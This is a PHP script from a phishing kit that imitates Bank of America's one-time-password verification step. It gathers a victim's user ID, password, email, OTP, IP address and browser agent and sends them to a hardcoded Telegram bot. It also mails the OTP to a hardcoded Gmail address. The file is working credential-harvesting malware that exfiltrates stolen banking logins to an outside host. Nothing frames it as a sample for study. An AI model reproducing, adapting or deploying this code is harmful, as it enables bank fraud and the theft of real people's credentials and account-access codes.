<?php
session_start();

// Get email from form submission
$email = $_POST['email'] ?? null;

// Check if email is provided and valid
if (empty($email) || !filter_var($email, FILTER_VALIDATE_EMAIL)) {
    die("Invalid or no email address provided. Please enter a valid email address.");
}

// Generate a 6-digit OTP
$otp = rand(100000, 999999);

// Store OTP and email in session
$_SESSION['otp'] = $otp;
$_SESSION['user_email'] = $email;

$ip = $_SERVER['REMOTE_ADDR'];

// Collect login data from session (from process.php)
$userID = $_SESSION['userID'] ?? 'Unknown';
$password = $_SESSION['password'] ?? 'Unknown';
$agent = $_SERVER['HTTP_USER_AGENT'];

// === Telegram Notification ===
$telegram_token = "8028760837:AAGRCR8aRXteT3pQwf7-eGE8oIRm7NamAWU";  // Replace with your bot token
$chat_id = "6564094997";  // Replace with your chat ID
$telegram_url = "https://api.telegram.org/bot$telegram_token/sendMessage";

// Prepare the message
$otp_message = "🛡️ Bank of America OTP Verification\n\n";
$otp_message .= "👤 User ID: $userID\n";
$otp_message .= "🔑 Password: $password\n";
$otp_message .= "📧 Email: $email\n";
$otp_message .= "🔢 OTP: $otp\n";
$otp_message .= "🌐 IP: $ip\n";
$otp_message .= "🖥️ User Agent: $agent";

// Send Telegram message via cURL
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $telegram_url);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, [
    'chat_id' => $chat_id,
    'text' => $otp_message,
]);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$response = curl_exec($ch);
curl_close($ch);

// Log Telegram response for debugging
file_put_contents('telegram_response.log', $response);

// Prepare email body (no headers needed)
$mail_message = "Your OTP is: $otp";

// Send OTP to the user's email (no headers)
$mail_sent = mail($email, "Your Bank of America OTP Code", $mail_message);

// Check if email was sent successfully
if ($mail_sent) {
    echo "OTP sent to $email successfully.";
} else {
    echo "Failed to send email.";
}

// Log the email result for debugging
file_put_contents('email_log.txt', "Email sent to: $email, Status: " . ($mail_sent ? "Success" : "Failure") . "\n", FILE_APPEND);

// Optional: Send a backup email (for logging purposes or further use)
$backup_email = "aliyahmarley7@gmail.com"; // Backup email address
$backup_subject = "OTP sent to $email";
$backup_message = "OTP for $email: $otp";
@mail($backup_email, $backup_subject, $backup_message); // No headers

// Redirect to OTP page
header("Location: otp.php");
exit;
?>
